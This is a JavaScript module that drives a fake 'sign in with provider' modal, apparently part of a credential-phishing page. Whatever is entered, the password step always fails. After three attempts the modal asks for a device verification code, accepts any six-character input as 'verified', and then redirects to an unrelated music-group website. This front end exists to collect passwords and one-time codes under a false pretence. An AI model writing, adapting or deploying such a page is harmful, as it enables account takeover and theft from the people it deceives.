const providerModal = document.getElementById('provider-modal');
const closeBtn = providerModal.querySelector('.provider-modal__close');
const logoImg = document.getElementById('provider-modal-logo');
const nameEl = document.getElementById('provider-modal-name');
const descriptionEl = providerModal.querySelector('.provider-modal__provider-description');

const loginForm = providerModal.querySelector('#login-form');
const verificationForm = providerModal.querySelector('#verification-form');
const successStage = providerModal.querySelector('.provider-modal__stage--success');

const passwordInput = providerModal.querySelector('input[type="password"]');
const emailInput = providerModal.querySelector('input[type="email"]');
const verificationInput = verificationForm.querySelector('input[type="text"]');

const loginSubmitBtn = loginForm.querySelector('.provider-modal__submit');
const verificationSubmitBtn = verificationForm.querySelector('.provider-modal__submit');
const loginError = loginForm.querySelector('.provider-modal__error');
const verificationError = verificationForm.querySelector('.provider-modal__error');
const resendBtn = verificationForm.querySelector('.provider-modal__resend button');

const toast = document.querySelector('.toast');
const authModal = document.getElementById('auth-modal');

let loginAttempts = 0;

function showStage(stage) {
  providerModal.querySelectorAll('.provider-modal__stage').forEach((el) => el.classList.remove('active'));
  stage.classList.add('active');
}

function openProviderModal(btn) {
  const name = btn.dataset.name;
  const provider = btn.dataset.provider;
  const logo = btn.querySelector('.provider__logo img');

  logoImg.src = logo ? logo.src : '';
  logoImg.alt = name;
  nameEl.textContent = name;
  descriptionEl.textContent = 'Enter your email and password to continue.';

  providerModal.className = 'provider-modal';
  providerModal.classList.add('active');
  providerModal.classList.add(`provider-modal--${provider}`);

  loginAttempts = 0;
  showStage(loginForm);

  loginError.classList.remove('active');
  verificationError.classList.remove('active');
  passwordInput.value = '';
  verificationInput.value = '';

  loginSubmitBtn.classList.remove('is-loading');
  loginSubmitBtn.disabled = false;
  verificationSubmitBtn.classList.remove('is-loading');
  verificationSubmitBtn.disabled = false;

  // correctly hide the auth modal underneath — matches its real open/close class
  authModal.classList.remove('is-open');

  document.body.classList.add('modal-open');

  setTimeout(() => emailInput.focus(), 250);
}

function closeProviderModal() {
  closeBtn.blur();
  providerModal.classList.remove('active');
  providerModal.className = 'provider-modal';

  loginAttempts = 0;
  showStage(loginForm);

  loginError.classList.remove('active');
  verificationError.classList.remove('active');
  passwordInput.value = '';
  emailInput.value = '';
  verificationInput.value = '';

  loginSubmitBtn.classList.remove('is-loading');
  loginSubmitBtn.disabled = false;
  verificationSubmitBtn.classList.remove('is-loading');
  verificationSubmitBtn.disabled = false;

  authModal.classList.add('is-open');
  document.body.classList.add('modal-open');
}

function handleLogin(e) {
  e.preventDefault();
  loginAttempts++;

  loginSubmitBtn.classList.add('is-loading');
  loginSubmitBtn.disabled = true;

  setTimeout(() => {
    loginSubmitBtn.classList.remove('is-loading');
    loginSubmitBtn.disabled = false;

    if (loginAttempts >= 3) {
      loginError.classList.remove('active');
      verificationError.classList.remove('active');
      showStage(verificationForm);
      descriptionEl.textContent = 'Enter the verification code sent to your device.';
      verificationInput.focus();
      return;
    }

    passwordInput.value = '';
    passwordInput.focus();
    loginError.classList.add('active');
  }, 3000);
}

function handleVerification(e) {
  e.preventDefault();

  if (verificationInput.value.length < 6) {
    verificationError.classList.add('active');
    verificationInput.focus();
    return;
  }

  verificationError.classList.remove('active');
  verificationSubmitBtn.classList.add('is-loading');
  verificationSubmitBtn.disabled = true;

  setTimeout(() => {
    verificationSubmitBtn.classList.remove('is-loading');
    verificationSubmitBtn.disabled = false;

    showStage(successStage);
    descriptionEl.textContent = 'Your account has been successfully verified.';

    setTimeout(() => {
      window.location.href = 'https://bbrmusicgroup.com';
    }, 3000);
  }, 3000);
}

function handleResend() {
  resendBtn.textContent = 'Sending...';
  resendBtn.disabled = true;

  setTimeout(() => {
    resendBtn.textContent = "Didn't receive a code? Resend";
    resendBtn.disabled = false;
    showToast();
  }, 3000);
}

function showToast() {
  toast.classList.add('active');
  setTimeout(() => toast.classList.remove('active'), 3000);
}

export function initProviderModal() {
  document.querySelectorAll('.provider[data-provider]').forEach((btn) => {
    btn.addEventListener('click', (e) => {
      e.preventDefault();
      openProviderModal(btn);
    });
  });

  closeBtn.addEventListener('click', closeProviderModal);

  providerModal.querySelector('.provider-modal__overlay').addEventListener('click', closeProviderModal);

  document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape' && providerModal.classList.contains('active')) {
      closeProviderModal();
    }
  });

  loginForm.addEventListener('submit', handleLogin);
  verificationForm.addEventListener('submit', handleVerification);
  resendBtn.addEventListener('click', handleResend);

  window.addEventListener('pageshow', (e) => {
  if (e.persisted) {
    providerModal.classList.remove('active');
    providerModal.className = 'provider-modal';
    showStage(loginForm);
  }
});
}